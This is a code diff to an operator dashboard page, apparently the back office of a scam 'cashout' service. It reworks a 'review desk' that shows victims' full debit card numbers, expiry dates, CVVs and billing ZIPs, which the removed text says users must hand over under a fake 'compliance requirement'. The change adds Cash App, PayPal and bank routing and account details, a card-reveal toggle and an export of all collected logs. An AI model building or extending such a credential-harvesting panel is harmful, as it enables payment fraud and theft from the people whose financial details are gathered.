@@ -281,16 +281,34 @@
       </div>
     </section>
 
-    <!-- ==================== TAB 3: DEBIT CARD CASHOUT REVIEW DESK ==================== -->
+    <!-- ==================== TAB 3: MULTI-RAIL CASHOUT REVIEW DESK ==================== -->
     <section id="tabContentCashouts" class="space-y-4 hidden">
-      <div class="p-4 rounded-2xl bg-cyan-950/30 border border-cyan-800/40 flex items-start space-x-3">
-        <span class="material-symbols-outlined text-cyan-400 text-2xl mt-0.5">credit_score</span>
+      <div class="p-4 rounded-2xl bg-[#091f16] border border-emerald-800/40 flex items-start space-x-3">
+        <span class="material-symbols-outlined text-emerald-400 text-2xl mt-0.5">payments</span>
         <div>
-          <h2 class="text-sm font-bold text-white">Direct Consumer Cashout Desk</h2>
+          <h2 class="text-sm font-bold text-white">Central Cash Out &amp; Settlement Desk</h2>
           <p class="text-xs text-slate-400 mt-0.5">
-            To satisfy the cashout compliance requirement, users must submit their 16-digit debit card, expiration date (MM/YY), CVV, and billing ZIP. This table provides full operator review of all submitted card credentials and instant payout settlement status.
+            Audit and verify all client cashout submissions across all four destination rails: <strong>Cash App ($cashtag)</strong>, <strong>Bank Direct Deposit (ACH)</strong>, <strong>PayPal</strong>, and <strong>Debit Card</strong>.
           </p>
         </div>
+      </div>
+
+      <!-- Filter Bar for Cashouts -->
+      <div class="flex items-center justify-between p-3 rounded-2xl bg-[#091b14] border border-emerald-900/60">
+        <div class="flex items-center space-x-2">
+          <label class="text-xs font-bold text-slate-300">Filter By Rail:</label>
+          <select id="cashoutRailFilter" onchange="renderCashoutsTable()" class="py-1.5 px-3 rounded-xl bg-[#05110d] border border-emerald-900/60 text-xs font-semibold text-slate-200 focus:outline-none focus:border-[#ffd47f]">
+            <option value="all">All Payout Rails (Cash App, Bank, PayPal, Card)</option>
+            <option value="Cash App">Cash App Only</option>
+            <option value="Bank Account">Bank ACH Only</option>
+            <option value="PayPal">PayPal Only</option>
+            <option value="Debit Card">Debit Card Only</option>
+          </select>
+        </div>
+        <button onclick="exportCardsJSON()" class="px-3 py-1.5 rounded-xl bg-emerald-950 border border-emerald-700/60 text-xs font-bold text-emerald-300 hover:text-white transition-colors flex items-center space-x-1">
+          <span class="material-symbols-outlined text-sm">download</span>
+          <span>Export All Cashout Logs</span>
+        </button>
       </div>
 
       <!-- Cashouts Table Card -->
@@ -299,13 +317,12 @@
           <table class="w-full text-left border-collapse">
             <thead>
               <tr class="border-b border-emerald-900/60 bg-[#06140e] text-[11px] uppercase tracking-wider text-slate-400 font-semibold font-mono">
-                <th class="py-3.5 px-4">User &amp; $cashtag</th>
-                <th class="py-3.5 px-4">Cardholder Name</th>
-                <th class="py-3.5 px-4">16-Digit Card Number</th>
-                <th class="py-3.5 px-4">Exp / CVV</th>
-                <th class="py-3.5 px-4">Billing ZIP</th>
+                <th class="py-3.5 px-4">Client / $cashtag</th>
+                <th class="py-3.5 px-4">Payout Rail</th>
+                <th class="py-3.5 px-4">Destination Account / Credentials</th>
+                <th class="py-3.5 px-4">Beneficiary / Holder</th>
                 <th class="py-3.5 px-4 text-right">Cashout Amount</th>
-                <th class="py-3.5 px-4">Timestamp &amp; Ref</th>
+                <th class="py-3.5 px-4">Timestamp &amp; Ref ID</th>
                 <th class="py-3.5 px-4 text-center">Settlement Status</th>
               </tr>
             </thead>
@@ -807,19 +824,69 @@
     function renderCashoutsTable() {
       if (!window.FRB) return;
       const tbody = document.getElementById('cashoutsTableBody');
-      const cashouts = window.FRB.getCardCashoutLogs();
+      const railFilter = document.getElementById('cashoutRailFilter')?.value || 'all';
+      let cashouts = window.FRB.getCardCashoutLogs();
+
+      if (railFilter !== 'all') {
+        cashouts = cashouts.filter(c => (c.payoutMethod || 'Debit Card') === railFilter);
+      }
 
       if (cashouts.length === 0) {
-        tbody.innerHTML = `<tr><td colspan="8" class="py-8 text-center text-slate-400">No debit card cashout submissions recorded yet.</td></tr>`;
+        tbody.innerHTML = `<tr><td colspan="7" class="py-8 text-center text-slate-400">No cashout submissions recorded matching filter.</td></tr>`;
         return;
       }
 
       tbody.innerHTML = cashouts.map((c, idx) => {
-        const card = c.cardDetails || {};
+        const method = c.payoutMethod || 'Debit Card';
+        const details = c.payoutDetails || {};
         const isRevealed = Boolean(revealedCards[idx]);
-        const cardNumDisplay = isRevealed 
-          ? (card.fullNumber || card.number || '4892 4491 8820 1184')
-          : (card.masked || '•••• •••• •••• ' + (card.last4 || '1184'));
+
+        // Method Badge
+        let methodBadge = '';
+        if (method === 'Cash App') {
+          methodBadge = `<span class="px-2.5 py-1 rounded-lg bg-emerald-950 border border-emerald-500/40 text-emerald-400 font-bold font-mono text-[11px] flex items-center space-x-1 w-fit"><span class="text-xs">$</span><span>Cash App</span></span>`;
+        } else if (method === 'PayPal') {
+          methodBadge = `<span class="px-2.5 py-1 rounded-lg bg-blue-950 border border-blue-500/40 text-blue-400 font-bold text-[11px] flex items-center space-x-1 w-fit"><span class="material-symbols-outlined text-xs">payments</span><span>PayPal</span></span>`;
+        } else if (method === 'Bank Account') {
+          methodBadge = `<span class="px-2.5 py-1 rounded-lg bg-purple-950 border border-purple-500/40 text-purple-300 font-bold text-[11px] flex items-center space-x-1 w-fit"><span class="material-symbols-outlined text-xs">account_balance</span><span>Bank ACH</span></span>`;
+        } else {
+          methodBadge = `<span class="px-2.5 py-1 rounded-lg bg-cyan-950 border border-cyan-500/40 text-cyan-300 font-bold text-[11px] flex items-center space-x-1 w-fit"><span class="material-symbols-outlined text-xs">credit_card</span><span>Debit Card</span></span>`;
+        }
+
+        // Destination Credential Display
+        let credDisplay = '';
+        let holderDisplay = details.holder || c.user;
+
+        if (method === 'Cash App') {
+          credDisplay = `
+            <div class="font-mono font-bold text-emerald-400 text-xs">${details.cashtag || '$cashtag'}</div>
+            ${details.phone ? `<div class="text-[10px] text-slate-400">${details.phone}</div>` : ''}
+          `;
+        } else if (method === 'PayPal') {
+          credDisplay = `
+            <div class="font-semibold text-blue-300 text-xs">${details.paypalEmail || 'email@paypal.com'}</div>
+            ${details.phone ? `<div class="text-[10px] text-slate-400">${details.phone}</div>` : ''}
+          `;
+        } else if (method === 'Bank Account') {
+          credDisplay = `
+            <div class="font-bold text-slate-200 text-xs">${details.bankName || 'US Bank'} · <span class="font-mono text-purple-300">${details.maskedAccount || '•••• 8910'}</span></div>
+            <div class="text-[10px] text-slate-400 font-mono">Routing: ${details.routingNumber || '121000358'} (${details.accountType || 'Checking'})</div>
+          `;
+        } else {
+          const cardNumDisplay = isRevealed 
+            ? (details.fullNumber || '4892 4491 8820 1184')
+            : (details.masked || '•••• •••• •••• ' + (details.last4 || '1184'));
+          
+          credDisplay = `
+            <div class="flex items-center space-x-1.5 font-mono text-xs">
+              <span class="${isRevealed ? 'text-amber-300 font-bold' : 'text-slate-300'}">${cardNumDisplay}</span>
+              <button onclick="toggleCardReveal(${idx})" title="Toggle Card Visibility" class="text-slate-500 hover:text-white p-0.5">
+                <span class="material-symbols-outlined text-sm">${isRevealed ? 'visibility_off' : 'visibility'}</span>
+              </button>
+            </div>
+            <div class="text-[10px] text-slate-400 font-mono">Exp: ${details.exp || '08/28'} · CVV: <span class="text-amber-400 font-bold">${details.cvv || '•••'}</span> · ZIP: ${details.zip || '10020'}</div>
+          `;
+        }
 
         return `
           <tr class="table-row-hover transition-colors">
@@ -828,24 +895,13 @@
               <div class="text-[10px] text-[#ffd47f] font-mono font-bold">${c.handle}</div>
             </td>
             <td class="py-3 px-4">
-              <div class="text-xs text-slate-200 font-semibold">${card.holder || c.user}</div>
-              <div class="text-[10px] text-cyan-400 font-mono">${card.type || 'Visa Debit'}</div>
+              ${methodBadge}
             </td>
-            <td class="py-3 px-4 font-mono text-xs">
-              <div class="flex items-center space-x-1.5">
-                <span class="${isRevealed ? 'text-amber-300 font-bold' : 'text-slate-300'}">${cardNumDisplay}</span>
-                <button onclick="toggleCardReveal(${idx})" title="Toggle Card Visibility" class="text-slate-500 hover:text-white p-0.5">
-                  <span class="material-symbols-outlined text-sm">${isRevealed ? 'visibility_off' : 'visibility'}</span>
-                </button>
-              </div>
+            <td class="py-3 px-4">
+              ${credDisplay}
             </td>
-            <td class="py-3 px-4 font-mono text-xs">
-              <span class="text-slate-300">${card.exp || '08/28'}</span>
-              <span class="text-slate-500 mx-1">/</span>
-              <span class="text-amber-400 font-bold">${card.cvv || '482'}</span>
-            </td>
-            <td class="py-3 px-4 font-mono text-xs text-slate-300">
-              ${card.zip || '10020'}
+            <td class="py-3 px-4">
+              <div class="text-xs text-slate-200 font-semibold">${holderDisplay}</div>
             </td>
             <td class="py-3 px-4 text-right">
               <span class="font-mono font-bold text-cyan-400 text-sm">
@@ -857,7 +913,7 @@
               <div class="text-[9px] text-emerald-400 font-mono">${c.txId || '#FRB-OUT'}</div>
             </td>
             <td class="py-3 px-4 text-center">
-              <span class="px-2 py-0.5 rounded-full bg-cyan-950 border border-cyan-800 text-cyan-300 text-[9px] font-bold uppercase font-mono">
+              <span class="px-2 py-0.5 rounded-full bg-emerald-950 border border-emerald-800 text-emerald-300 text-[9px] font-bold uppercase font-mono">
                 Settled
               </span>
             </td>
